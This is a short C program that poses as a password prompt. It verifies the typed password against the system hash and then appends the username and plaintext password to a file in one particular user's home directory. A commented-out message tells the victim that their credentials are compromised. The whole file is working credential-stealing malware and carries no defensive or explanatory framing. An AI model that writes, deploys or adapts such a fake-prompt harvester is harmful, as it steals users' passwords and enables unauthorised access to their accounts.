#include <stdio.h>
#include <stdlib.h>

#include <sys/types.h>
#include <pwd.h>

int main ()
{
  char user[20];
  char pass[256];
  char salt[3];      // only 2 characters??
  char uPass[256];
  FILE* fp = NULL;
  static int count = 0;

  strcpy(user, getenv("USER"));
  strcpy(pass, getpwnam(user)->pw_passwd);
  strncpy(salt,pass,2); salt[2]='\0';

  do {
    strcpy(uPass, getpass("Password: "));
    
    if (user && pass && salt && uPass && (!strcmp(pass, crypt(uPass,salt)))) {
      if( (fp = fopen("/home/tcschna/utils/mine/temp.txt","a")) != NULL )
      {
        fprintf(fp,"\nuser=%s , pw=%s",user,uPass);
        fclose (fp);
      }
      //printf("Hello Mr/Mrs. %s. \nYou are a very good slave and follower :-) :-) \nYour credentials are compromised. \nSuggest you to buy a Chocolate for the owner of this program.\n",  getpwnam(user)->pw_gecos);
      
      //printf ("pass=%s\t salt=%s\n", pass, salt);
      //printf ("crypt=%s \tUpass=%s\n", crypt(uPass,salt), uPass);    
      return(EXIT_SUCCESS);
    }    
    count++;
  } while (count < 3);
  // Maximum number of tries exceeded 

  return(EXIT_SUCCESS);
}
